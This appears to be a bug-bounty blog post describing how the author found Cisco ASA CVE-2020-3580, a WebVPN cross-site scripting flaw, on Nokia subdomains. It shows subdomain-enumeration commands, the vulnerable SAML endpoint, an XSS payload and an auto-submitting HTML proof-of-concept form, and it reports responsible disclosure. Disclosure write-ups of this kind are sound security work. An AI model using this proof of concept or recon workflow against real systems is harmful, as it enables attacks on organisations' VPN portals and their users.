---
title:  "Exploiting Cisco ASA CVE-2020-3580: How I Discovered the Vulnerability on Nokia Subdomains"
layout: post
---

Cisco Adaptive Security Appliance (ASA) is a tool used for corporate VPN access, firewall protection, and threat management. However, it is not without its vulnerabilities. One such vulnerability, **<span style="color: #4682B4;">CVE-2020-3580</span>**, was discovered in 2020 and affects the WebVPN portal, allowing attackers to execute cross-site scripting (XSS) attacks that could compromise connected systems.

In this post, I‚Äôll explain how I uncovered this vulnerability on various Nokia subdomains using reconnaissance techniques.

<h1 style="color: #2E86C1;">üïµÔ∏è‚Äç‚ôÇÔ∏è Reconnaissance:</h1>

The first step in bug bounty hunting or vulnerability research is always reconnaissance. My goal was to map out the Nokia attack surface to find potentially vulnerable assets, and for that, I leveraged several tools and methods.

### <span style="color: #27AE60;">Passive Reconnaissance</span>

I started with passive recon to gather subdomains and IPs associated with Nokia. For this, I used the following tools and techniques:

#### <span style="color: #27AE60;">Subdomain Enumeration:</span>

I used tools like **<span style="color: #2980B9;">Sublist3r</span>**, **<span style="color: #2980B9;">Amass</span>**, and **<span style="color: #2980B9;">Subfinder</span>** to gather a large list of Nokia subdomains:

````
subfinder -d nokia.com -o nokia-subdomains.txt amass enum -d nokia.com -o nokia-amass.txt
````

This provided a list of subdomains that are publicly known and might host various services, including VPN portals. After gathering subdomains, I looked for endpoints that were hosting web interfaces. Using tools like httpx, I quickly fingerprinted these subdomains to check for VPN interfaces, login pages, or any Cisco ASA systems.

````
cat nokia-subdomains.txt nokia-amass.txt | sort -u | tee subdomains.txt cat subdomains.txt | httpx -status-code -title -tech-detect -o output.txt
````
Many subdomains returned HTTP 200 with Cisco VPN or WebVPN portals exposed.
## <span style="color: #2E86C1;">Testing for CVE-2020-3580:</span>
To test for the vulnerability, we need to send a POST request to /+CSCOE+/saml/sp/acs?tgname=a with the SAMLResponse parameter set to a payload that triggers the XSS vulnerability. The payload is: "><svg/onload=alert('xss')>
### <span style="color: #27AE60;">Steps to Reproduce:</span>

```
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://‚ñà‚ñà‚ñà‚ñà/+CSCOE+/saml/sp/acs?tgname=a" method="POST">
      <input type="hidden" name="SAMLResponse" value="&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;&apos;XSS&apos;&#41;&gt;" />
      <input type="hidden" name="" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
‚ö†Ô∏è <span style="color: #27AE60;">CVE-2020-3580 on Nokia Subdomains:</span>
I wrote a Bash script to check each of the subdomains for this vulnerability. Many of the subdomains were found to be vulnerable, and I reported them to Nokia through their responsible disclosure policy.

üìÖ <span style="color: #16A085;">Disclosure Timelines:</span>
- 17 Aug 2022 ‚Äî Vulnerability discovered and reported.
- 18 Aug 2022 ‚Äî Team confirmed receipt of the report.
- 20 Aug 2022 ‚Äî I earned a spot on their Hall of Fame page.

